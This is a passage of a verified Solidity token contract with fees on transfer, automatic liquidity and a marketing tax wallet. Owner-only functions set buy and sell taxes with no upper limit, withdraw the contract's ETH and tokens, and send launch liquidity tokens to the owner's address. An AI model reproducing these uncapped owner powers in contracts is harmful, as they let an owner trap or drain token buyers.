100;\r\n                    super._transfer(sender, address(this), feeAmount);\r\n                }\r\n                else if (sender != pair) {\r\n                    uint256 ethBal = address(this).balance;\r\n                    uint256 feeAmount = (amount * (feeswap - _cutFee(ethBal))) / 100;\r\n                    super._transfer(sender, address(this), feeAmount);\r\n                }  // transfer fee zero\r\n            }\r\n        }\r\n    }\r\n\r\n    function handle_fees(uint256 feeswap, Taxes memory swapTaxes) private mutexLock {\r\n\t    if(feeswap == 0){\r\n            return;\r\n        }\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        if (contractBalance >= tokenLiquidityThreshold) {\r\n            if (tokenLiquidityThreshold > 1) {\r\n                contractBalance = tokenLiquidityThreshold;\r\n            }\r\n\r\n            // Split the contract balance into halves\r\n            uint256 denominator = feeswap * 2;\r\n            uint256 tokensToAddLiquidityWith = (contractBalance * swapTaxes.liquidity) / denominator;\r\n            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;\r\n\r\n            uint256 initialBalance = address(this).balance;\r\n\r\n            swapTokensForETH(toSwap);\r\n\r\n            uint256 deltaBalance = address(this).balance - initialBalance;\r\n            uint256 unitBalance = deltaBalance / (denominator - swapTaxes.liquidity);\r\n            uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;\r\n\r\n            if (ethToAddLiquidityWith > 0) {\r\n                // Add liquidity\r\n                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);\r\n            }\r\n\r\n            uint256 marketingAmt = unitBalance * 2 * swapTaxes.marketing;\r\n            if (marketingAmt > 0) {\r\n                payable(_taxWallet).sendValue(marketingAmt);\r\n            }\r\n        }\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        // generate the pair path of token -> weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n\r\n        _approve(address(this), address(router), tokenAmount);\r\n\r\n        // make the swap\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), address(router), tokenAmount);\r\n\r\n        // add the liquidity\r\n        router.addLiquidityETH{ value: ethAmount }(\r\n            address(this),\r\n            tokenAmount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            deadWallet,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function AddExemptFee(address _address) external onlyOwner {\r\n        excludedFee[_address] = true;\r\n    }\r\n\r\n    function RemoveExemptFee(address _address) external onlyOwner {\r\n        excludedFee[_address] = false;\r\n    }\r\n\r\n    function AddbulkExemptFee(address[] memory accounts) external onlyOwner {\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            excludedFee[accounts[i]] = true;\r\n        }\r\n    }\r\n\r\n    function UpdateBuyTaxes(\r\n        uint256 _marketing,\r\n        uint256 _liquidity\r\n    ) external onlyOwner {\r\n        taxes = Taxes(_marketing, _liquidity);\r\n    }\r\n\r\n    function SetSellTaxes(\r\n        uint256 _marketing,\r\n        uint256 _liquidity\r\n    ) external onlyOwner {\r\n        sellTaxes = Taxes(_marketing, _liquidity);\r\n    }\r\n\r\n    function RemovebulkExemptFee(address[] memory accounts) external onlyOwner {\r\n        for (uint256 i = 0; i < accounts.length; i++) {\r\n            excludedFee[accounts[i]] = false;\r\n        }\r\n    }\r\n\r\n    function updateLiquidityProvide(bool state) external onlyOwner {\r\n        //update liquidity providing state\r\n        providingLiquidity = state;\r\n    }\r\n\r\n    function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {\r\n        //update the treshhold\r\n        tokenLiquidityThreshold = new_amount * 10**decimals();\r\n    }\r\n\r\n    function updateDeadline(uint256 _deadline) external onlyOwner {\r\n        require(!tradingEnabled, \"Can't change when trading has started\");\r\n        deadline = _deadline;\r\n    }\r\n\r\n    function updateMaxWallets(uint256 maxWallet) external onlyOwner {\r\n        maxWalletLimit = maxWallet * 10**decimals();\r\n    }\r\n\r\n    function updateTaxWallet(address newWallet) external onlyOwner {\r\n        _taxWallet = newWallet;\r\n    }\r\n\r\n    function rescueETH(uint256 weiAmount) external onlyOwner {\r\n        payable(owner()).transfer(weiAmount);\r\n    }\r\n\r\n    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {\r\n        IERC20(tokenAdd).transfer(owner(), amount);\r\n    }\r\n\r\n    function stealthLaunch() external onlyOwner {\r\n        pair = IFactory(router.factory()).createPair(address(this), router.WETH());\r\n        approve(address(router), type(uint256).max);\r\n        router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0, \r\n            0, \r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        require(!tradingEnabled, \"Trading is already enabled\");\r\n        tradingEnabled = true;\r\n        genesis_block = block.number;\r\n    }\r\n\r\n    // fallbacks\r\n    receive() external payable {}\r\n}",
    "etherscan_verified": true
}